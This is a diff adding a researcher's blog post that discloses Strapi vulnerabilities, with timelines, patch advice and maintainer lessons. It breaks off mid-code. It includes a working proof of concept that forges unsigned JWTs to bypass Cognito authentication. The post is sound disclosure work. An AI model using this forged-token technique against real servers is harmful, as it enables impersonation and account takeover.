@@ -1,0 +1,3808 @@
+<html>
+	<head>
+		<title>GhostCcamm's Cyber Misadventures</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/styles.css" />
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header" class="alt">
+					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
+					<nav>
+						<a href="#menu">Menu</a>
+					</nav>
+				</header>
+
+			<!-- Menu -->
+				<nav id="menu">
+					<div class="inner">
+						<h2>Menu</h2>
+						<ul class="links">
+							<li><a href="/">Home</a></li>
+							<li><a href="/blog">Blog</a></li>
+							<li><a href="/writeups">Write Ups</a></li>
+						</ul>
+						<a href="#" class="close">Close</a>
+					</div>
+				</nav>
+
+			<!-- Banner -->
+		    <section id="banner">
+		      <div class="inner">
+		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
+		        <h2>Multiple Critical Vulnerabilities in Strapi Versions <=4.7.1</h2>
+						<p class="date">2023-04-17</p>
+		        <p>A story about the vulnerabilities I discovered in Strapi that include Server-Side Template Injection, hijacking admin accounts and bypassing authentication.</p>
+		      </div>
+		    </section>
+
+      <section id="wrapper">
+<section class="wrapper style4 ">
+<div class="inner">
+<div class="content">
+<h1 class="major" id="overview">
+ Overview
+</h1>
+<p>
+ Recently, I have decided to start finding vulnerabilities in open source web applications (thank you to the holiday period for giving me the time) and thought I should give
+ <a href="https://strapi.io/">
+  Strapi
+ </a>
+ a look.
+ <a href="https://strapi.io/">
+  Strapi
+ </a>
+ is the most popular NodeJS based Headless Content Management System (CMS), and playing around with it I definitely see why it is a popular choice to create web APIs quickly. Doing a quick search for Strapi servers on
+ <a href="https://www.shodan.io/">
+  Shodan
+ </a>
+ shows over
+ <strong>
+  19,000 results
+ </strong>
+ , which is a lot for a new CMS.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/shodan-results.png"/>
+</p>
+<p>
+ However, after a bit of tinkering with Strapi I discovered
+ <strong>
+  three vulnerabilities:
+ </strong>
+</p>
+<ul>
+ <li>
+  <strong>
+   CVE-2023-22893
+  </strong>
+  : Authentication Bypass for AWS Cognito Login Provider in Strapi Versions &lt;=4.5.6
+ </li>
+ <li>
+  <strong>
+   CVE-2023-22621
+  </strong>
+  : SSTI to RCE by Exploiting Email Templates in Strapi Versions &lt;=4.5.5
+ </li>
+ <li>
+  <strong>
+   CVE-2023-22894
+  </strong>
+  : Leaking Sensitive User Information by Filtering on Private Fields in Strapi Versions &lt;=4.7.1
+ </li>
+</ul>
+<p>
+ <strong>
+  CVE-2023-22894
+ </strong>
+ and
+ <strong>
+  CVE-2023-22621
+ </strong>
+ can be chained together in an automated script to hijack
+ <strong>
+  Super Admin Users
+ </strong>
+ on Strapi then
+ <strong>
+  execute code as an unauthenticated user
+ </strong>
+ on all Strapi versions &lt;=4.5.5.
+</p>
+<p>
+ I will be doing a deep dive into each of these vulnerabilities individually, so
+ <em>
+  strapi
+ </em>
+ in for a wild ride.
+</p>
+<p>
+ This article will also document how Strapi handled my vulnerability discloses and patched each vulnerability, since it is an important story for other organisations about
+ <strong>
+  how to handle vulnerability disclosures correctly
+ </strong>
+ . This has been my best experience reporting security vulnerabilities to any organisation by far. Strapi's transparent communication and rapid responses with me was something I have never seen before, and I do want to give the company a massive shout out.
+</p>
+<p>
+ <em>
+  Now let's get into the fun stuff and start popping shells, dumping password hashes and hacking into accounts!
+ </em>
+</p>
+<p>
+ <strong>
+  Table of Contents
+ </strong>
+</p>
+<!-- Yes Alok the TOC doesn't reference itself this time... -->
+<div class="toc">
+ <ul>
+  <li>
+   <a href="#overview">
+    Overview
+   </a>
+  </li>
+  <li>
+   <a href="#tldr">
+    TL;DR
+   </a>
+  </li>
+  <li>
+   <a href="#disclaimers">
+    Disclaimers
+   </a>
+  </li>
+  <li>
+   <a href="#cve-2023-22893-authentication-bypass-for-aws-cognito-login-provider-in-strapi-versions-456">
+    CVE-2023-22893: Authentication Bypass for AWS Cognito Login Provider in Strapi Versions &lt;=4.5.6
+   </a>
+   <ul>
+    <li>
+     <a href="#tldr-vulnerability-details">
+      TL;DR Vulnerability Details
+     </a>
+    </li>
+    <li>
+     <a href="#vulnerability-disclosure-timeline">
+      Vulnerability Disclosure Timeline
+     </a>
+    </li>
+    <li>
+     <a href="#how-to-exploit-strapi-aws-cognito-authentication-bypass-vulnerability">
+      How to Exploit Strapi AWS Cognito Authentication Bypass Vulnerability
+     </a>
+    </li>
+    <li>
+     <a href="#a-lesson-for-open-source-project-maintainers">
+      A Lesson for Open-Source Project Maintainers
+     </a>
+    </li>
+    <li>
+     <a href="#how-strapi-fixed-the-vulnerability">
+      How Strapi Fixed the Vulnerability
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455">
+    CVE-2023-22621: SSTI to RCE by Exploiting Email Templates in Strapi Versions &lt;=4.5.5
+   </a>
+   <ul>
+    <li>
+     <a href="#tldr-vulnerability-details_1">
+      TL;DR Vulnerability Details
+     </a>
+    </li>
+    <li>
+     <a href="#vulnerability-disclosure-timeline_1">
+      Vulnerability Disclosure Timeline
+     </a>
+    </li>
+    <li>
+     <a href="#reproducing-the-ssti-vulnerability">
+      Reproducing the SSTI Vulnerability
+     </a>
+    </li>
+    <li>
+     <a href="#discovering-and-exploiting-this-vulnerability">
+      Discovering and Exploiting this Vulnerability
+     </a>
+     <ul>
+      <li>
+       <a href="#exploiting-lodash-template-injection">
+        Exploiting Lodash Template Injection
+       </a>
+      </li>
+      <li>
+       <a href="#bypassing-the-email-template-validation-check">
+        Bypassing the Email Template Validation Check
+       </a>
+      </li>
+      <li>
+       <a href="#putting-it-all-together">
+        Putting it All Together
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#my-recommendation-for-patching-the-vulnerability">
+      My Recommendation for Patching the Vulnerability
+     </a>
+     <ul>
+      <li>
+       <a href="#til-logic-less-template-engines-exist">
+        TIL: Logic-less Template Engines Exist
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#how-strapi-fixed-the-vulnerability_1">
+      How Strapi Fixed the Vulnerability
+     </a>
+     <ul>
+      <li>
+       <a href="#setting-strict-delimiter-regex-patterns-for-template-engines-to-prevent-evaluating-unintended-blocks">
+        Setting Strict Delimiter Regex Patterns for Template Engines to Prevent Evaluating Unintended Blocks
+       </a>
+      </li>
+      <li>
+       <a href="#fixing-the-email-template-validation">
+        Fixing the Email Template Validation
+       </a>
+      </li>
+     </ul>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471">
+    CVE-2023-22894: Leaking Sensitive User Information by Filtering on Private Fields in Strapi Versions &lt;=4.7.1
+   </a>
+   <ul>
+    <li>
+     <a href="#tldr-vulnerability-details_2">
+      TL;DR Vulnerability Details
+     </a>
+    </li>
+    <li>
+     <a href="#vulnerability-disclosure-timeline_2">
+      Vulnerability Disclosure Timeline
+     </a>
+    </li>
+    <li>
+     <a href="#dumping-sensitive-user-as-an-administrator-user">
+      Dumping Sensitive User as an Administrator User
+     </a>
+    </li>
+    <li>
+     <a href="#but-wait-it-gets-worst">
+      But Wait, It Gets Worst...
+     </a>
+    </li>
+    <li>
+     <a href="#but-wait-it-is-the-worst-case-scenario">
+      But Wait, It Is The Worst Case Scenario...
+     </a>
+    </li>
+    <li>
+     <a href="#why-it-took-months-to-fix">
+      Why It Took Months To Fix
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#chaining-cve-2023-22621-and-cve-2023-22894-together-to-achieve-unauthenticated-rce">
+    Chaining CVE-2023-22621 and CVE-2023-22894 Together to Achieve Unauthenticated RCE
+   </a>
+  </li>
+  <li>
+   <a href="#indicators-of-compromise">
+    Indicators of Compromise
+   </a>
+   <ul>
+    <li>
+     <a href="#detecting-aws-cognito-auth-bypass-cve-2023-22893">
+      Detecting AWS Cognito Auth Bypass (CVE-2023-22893)
+     </a>
+    </li>
+    <li>
+     <a href="#detecting-leaking-sensitive-user-data-cve-2023-22894">
+      Detecting Leaking Sensitive User Data (CVE-2023-22894)
+     </a>
+    </li>
+    <li>
+     <a href="#detecting-remote-code-execution-cve-2023-22621">
+      Detecting Remote Code Execution (CVE-2023-22621)
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#conclusion">
+    Conclusion
+   </a>
+  </li>
+ </ul>
+</div>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="tldr">
+ TL;DR
+</h1>
+<p>
+ If you are still using
+ <strong>
+  Strapi versions &lt;4.8.0
+ </strong>
+ and you are reading this article...
+</p>
+<p>
+ <strong>
+  Please stop reading this article and immediately update your Strapi server!
+ </strong>
+</p>
+<p>
+ I also highly recommend going straight to the
+ <a href="#indicators-of-compromise">
+  <strong>
+   Indicators of Compromise section
+  </strong>
+ </a>
+ and
+ <strong>
+  start incident response
+ </strong>
+ ! There is a very high chance that a malicious actor has already attempted to compromise your server!
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="disclaimers">
+ Disclaimers
+</h1>
+<ul>
+ <li>
+  I am not affiliated with Strapi or any business partner of Strapi.
+ </li>
+ <li>
+  The work I did discovering, reporting and providing advice were done in my personal time.
+ </li>
+ <li>
+  This research is not related in anyway to my current employment.
+ </li>
+ <li>
+  My sole intent has alway been to protect people and organisations from cyber crime.
+ </li>
+</ul>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="cve-2023-22893-authentication-bypass-for-aws-cognito-login-provider-in-strapi-versions-456">
+ CVE-2023-22893: Authentication Bypass for AWS Cognito Login Provider in Strapi Versions &lt;=4.5.6
+</h1>
+<p>
+ The first vulnerability I will explain will be the authentication bypass for the AWS Cognito login provider, since it is the easiest to explain (got to build up the suspense).
+</p>
+<p>
+ Whenever I review source code one of the first things I want to check is how authentication and authorisation is implemented. Upon reviewing Strapi's login provider code authentication, I saw the following code snippet for handling authentication for the
+ <a href="https://aws.amazon.com/cognito/">
+  AWS Cognito login provider
+ </a>
+ .
+</p>
+<p>
+ <a href="https://github.com/strapi/strapi/blob/v4.5.6/packages/plugins/users-permissions/server/services/providers-registry.js">
+  <strong>
+   <code>
+    @strapi/plugin-users-permissions/server/services/providers-registry.js
+   </code>
+  </strong>
+ </a>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="w">  </span><span class="k">async</span><span class="w"> </span><span class="nx">cognito</span><span class="p">({</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// get the id_token</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">idToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">query</span><span class="p">.</span><span class="nx">id_token</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// decode the jwt token</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">tokenPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">idToken</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">tokenPayload</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">'unable to decode jwt token'</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">tokenPayload</span><span class="p">[</span><span class="s1">'cognito:username'</span><span class="p">],</span><span class="w"></span>
+<span class="w">        </span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="nx">tokenPayload</span><span class="p">.</span><span class="nx">email</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="p">};</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">},</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ <em>
+  Where was the OAuth token verification?
+ </em>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/where.gif"/>
+</p>
+<p>
+ <strong>
+  This meant that an attacker could forge a JWT token to impersonate any user who use AWS Cognito to authenticate!
+ </strong>
+ Fortunately this vulnerability only impacts
+ <strong>
+  Strapi API user authentication
+ </strong>
+ , and this vulnerability cannot be exploited to gain access to the admin panel.
+</p>
+<p>
+ I will explain how you can exploit this vulnerability and discuss how Strapi handled patching this vulnerability. I will also use this opportunity spread my paranoia about external contributions to open-source projects.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="tldr-vulnerability-details">
+ TL;DR Vulnerability Details
+</h2>
+<ul>
+ <li>
+  <strong>
+   CVE:
+  </strong>
+  CVE-2023-22893
+ </li>
+ <li>
+  <strong>
+   CVSS v3.1 Vector:
+  </strong>
+  <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N&amp;version=3.1">
+   AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+  </a>
+ </li>
+ <li>
+  <strong>
+   Impacted Versions:
+  </strong>
+  &gt;=3.2.1,&lt;4.6.0
+ </li>
+ <li>
+  <strong>
+   How to Patch:
+  </strong>
+  Immediately
+  <strong>
+   update
+  </strong>
+  your Strapi to version
+  <strong>
+   &gt;=4.6.0
+  </strong>
+  ! If you using Strapi
+  <strong>
+   3.x.x
+  </strong>
+  or below,
+  <strong>
+   IMMEDIATELY UPDATE TO A PATCHED 4.x.x VERSION!
+  </strong>
+  Strapi versions 3.x.x reached its
+  <strong>
+   end of life support on the December 31st 2022
+  </strong>
+  , and would
+  <strong>
+   not receive a patch
+  </strong>
+  for this vulnerability!
+ </li>
+</ul>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="vulnerability-disclosure-timeline">
+ Vulnerability Disclosure Timeline
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Time
+   </th>
+   <th>
+    Event
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    2023/01/01 09:14 AM UTC
+   </td>
+   <td>
+    Disclosed to Strapi this authentication bypass vulnerability.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/01 08:35 PM UTC
+   </td>
+   <td>
+    Received an acknowledgement from Strapi that they have received my report (
+    <em>
+     woah that is fast on New Years day
+    </em>
+    ).
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/04 10:53 AM UTC
+   </td>
+   <td>
+    Strapi reproduced the vulnerability.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/09 04:49 PM UTC
+   </td>
+   <td>
+    Strapi developed a
+    <em>
+     fix
+    </em>
+    and provided me with the nightly build to verify the vulnerability has been patched.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/10 12:19 PM UTC
+   </td>
+   <td>
+    From a static analysis, I reported to Strapi that the fix still had an authentication bypass vulnerability by modifying the
+    <code>
+     iss
+    </code>
+    claim.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/11 11:57 AM UTC
+   </td>
+   <td>
+    The Strapi developer correctly patched the vulnerability by adding a configurable JWKS url.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/25 08:21 PM UTC
+   </td>
+   <td>
+    Strapi released version
+    <strong>
+     4.6.0
+    </strong>
+    that patches this vulnerability.
+   </td>
+  </tr>
+ </tbody>
+</table>
+</div>
+</div>
+</section>
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="how-to-exploit-strapi-aws-cognito-authentication-bypass-vulnerability">
+ How to Exploit Strapi AWS Cognito Authentication Bypass Vulnerability
+</h2>
+<p>
+ Bypassing the AWS Cognito authentication for Strapi was
+ <strong>
+  extremely easy
+ </strong>
+ , since the OAuth ID token was
+ <strong>
+  never verified
+ </strong>
+ . So all you have to do is create a JWT token (does not matter what secret or signing algorithm you use) and set the email claim to be the same as your victim.
+</p>
+<p>
+ <em>
+  That's it...
+ </em>
+</p>
+<p>
+ You can use the following proof of concept (POC) for generating the JWT.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">jwt</span>
+
+<span class="n">EMAIL_TO_IMPERSONATE</span><span class="o">=</span><span class="s2">"ghostccamm@testvm.local"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"cognito:username"</span><span class="p">:</span> <span class="s2">"auth-bypass-example"</span><span class="p">,</span>
+        <span class="s2">"email"</span><span class="p">:</span> <span class="n">EMAIL_TO_IMPERSONATE</span>
+<span class="p">}</span>
+
+<span class="n">jwt_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"JWT Token: </span><span class="si">{</span><span class="n">jwt_token</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>
+ Then just send that token to
+ <code>
+  /api/auth/cognito/callback?access_token=something&amp;id_token=&lt;JWT PAYLOAD&gt;
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/demo.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="a-lesson-for-open-source-project-maintainers">
+ A Lesson for Open-Source Project Maintainers
+</h2>
+<p>
+ You might be wondering
+ <em>
+  how did this code get added to Strapi
+ </em>
+ ? It was pointed out to me during my disclosure to Strapi that the vulnerable code was added by an external community member in a pull request. I won't be referencing the pull request, because I do not want to start a witch hunt. Instead, I want to focus on the importance of reviewing pull requests, especially from external developers adding features to high risk functions within the application.
+</p>
+<p>
+ Coming from a security and development background, I immediately noticed the security vulnerability just from reading the source code. However, the Strapi engineers that reviewed the pull request were focused on asking the community developer to fix the merge conflicts. Their attention was diverted away from verifying if the pull request had secure code and consequently they missed the authentication bypass vulnerability that was introduced into Strapi version 3.2.1.
+</p>
+<p>
+ Going through the original pull request logs that introduced this vulnerability, I saw two massive red flags that should of indicated the pull request should of been reviewed with extra scrutiny.
+</p>
+<ol>
+ <li>
+  Changes were made to how Strapi handles authentication that could introduce a new severe vulnerability (like it did in this case).
+ </li>
+ <li>
+  The developer that created the pull request had only created their Github account only a few months earlier.
+ </li>
+</ol>
+<p>
+ I bring up the second point because the internet is a beautiful and
+ <strong>
+  dangerous
+ </strong>
+ place. Anyone with malicious intent could try to inject hidden backdoors into popular applications.
+</p>
+<p>
+ <strong>
+  Before I continue my point, I want to make it very clear that I am not accusing that developer that introduced this vulnerability was a malicious actor.
+ </strong>
+ It is very clear going through their Github profile at the time of writing this article that they are a passionate developer and just wanted to contribute to Strapi's development. However, at the time of the pull request (2020) the account was new and there was no evidence of their experience. This could indicate that the developer was new to software development, and could have a lack of secure software development experience. On the other hand, if we switch on our
+ <em>
+  paranoid worst case scenario security hat
+ </em>
+ the newly created account could be a malicious actor trying to insert a hidden backdoor into the software. Malicious actors have tried to commit backdoors into software in the past and it will always be one of their biggest goals for attackers.
+</p>
+<p>
+ Take for an example the
+ <a href="https://news-web.php.net/php.internals/113838">
+  hilarious attempt of inserting a backdoor into the PHP code base in 2021
+ </a>
+ . A malicious actor hacked into PHP's git server to commit the following code impersonating a PHP developer that would execute arbitrary code when a HTTP server contained the string "zerodium".
+</p>
+<p>
+ <a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">
+  From PHP commit
+  <code>
+   c730aa26bd52829a49f2ad284b181b7e82a68d7d
+  </code>
+ </a>
+ <br/>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/php-backdoor-attempt1.png"/>
+</p>
+<p>
+ Fortunately, a PHP developer noticed the backdoor the next day and
+ <a href="https://github.com/php/php-src/commit/046827a7e867bb0e655923c75c25a20d06e3aa8b">
+  reverted the change
+ </a>
+ . However,
+ <a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a">
+  <strong>
+   the mad lad tried it again!
+  </strong>
+ </a>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/php-backdoor-attempt2.png"/>
+</p>
+<p>
+ The point I want to convey to open-source maintainers is that they should be cautious of external contributions and review the changes more carefully. Unlike the above PHP backdoor scenario, a malicious actor could start a pull request that contains a far less obvious backdoor into your application. Saying that, working in security does require a
+ <em>
+  healthy
+ </em>
+ dose of anxiety and the most likely scenario would not be a backdoor attempt. I just wanted take this opportunity to communicate my concerns about the risks of community contributions to open-source software projects.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="how-strapi-fixed-the-vulnerability">
+ How Strapi Fixed the Vulnerability
+</h2>
+<p>
+ In my initial vulnerability report, I pointed Strapi to
+ <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html">
+  AWS's documentation about verifying Oauth tokens issued by Cognito
+ </a>
+ . Boiling down the documentation into a sentence, to verify JWT tokens issued by AWS Cognito you need to download the corresponding public JSON Web Key Set (JWKS) from the following URL and use the public key to verify the authenticity of the token.
+</p>
+<div class="codehilite">
+ <pre><span></span><code>https://cognito-idp.<span class="o">{</span>region<span class="o">}</span>.amazonaws.com/<span class="o">{</span>userPoolId<span class="o">}</span>/.well-known/jwks.json
+</code></pre>
+</div>
+<p>
+ However, Strapi's configuration options for the AWS Cognito login provider for versions &lt;4.6.0 did not have an option for storing the AWS region or User Pool ID required to retrieve the corresponding JWKS file. Therefore, a breaking change would have to be introduced to fix this vulnerability.
+</p>
+<p>
+ One of the developers at Strapi did attempt to fix the patch without needing to introduce a breaking change that can be seen
+ <a href="https://github.com/strapi/strapi/blob/37d2a1dfcb309a29747db0b97d0231b3a2b026b0/packages/plugins/users-permissions/server/services/providers-registry.js">
+  here
+ </a>
+ . The following code snippet shows the
+ <code>
+  getCognitoPayload
+ </code>
+ function that was added to
+ <em>
+  verify
+ </em>
+ AWS Cognito ID tokens. You can also test out it yourself by setting up a Strapi version for the nightly build
+ <code>
+  0.0.0-37d2a1dfcb309a29747db0b97d0231b3a2b026b0
+ </code>
+ (setup command below).
+</p>
+<div class="codehilite">
+ <pre><span></span><code>npx create-strapi-app@0.0.0-37d2a1dfcb309a29747db0b97d0231b3a2b026b0 testTID2212 --quickstart
+</code></pre>
+</div>
+<p>
+ <em>
+  The added code that was supposed to verify AWS Cognito tokens.
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">getCognitoPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">idToken</span><span class="p">,</span><span class="w"> </span><span class="nx">purest</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">header</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">kid</span><span class="w"> </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nx">payload</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">idToken</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">complete</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">payload</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">kid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">'The provided token is not valid'</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">iss</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">payload</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">cognito</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="nx">discovery</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">origin</span><span class="o">:</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">iss</span><span class="si">}</span><span class="sb">/.well-known/jwks.json`</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">''</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">  </span><span class="p">};</span><span class="w"></span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cognito</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">purest</span><span class="p">({</span><span class="w"> </span><span class="nx">provider</span><span class="o">:</span><span class="w"> </span><span class="s1">'cognito'</span><span class="p">,</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// get the JSON Web Key (JWK) for the user pool</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nx">jwk</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">cognito</span><span class="p">(</span><span class="s1">'discovery'</span><span class="p">).</span><span class="nx">request</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// Get the key with the same Key ID as the provided token</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">jwk</span><span class="p">.</span><span class="nx">keys</span><span class="p">.</span><span class="nx">find</span><span class="p">(({</span><span class="w"> </span><span class="nx">kid</span><span class="o">:</span><span class="w"> </span><span class="nx">jwkKid</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">jwkKid</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">kid</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">jwkToPem</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="c1">// https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">decodedToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="nx">reject</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
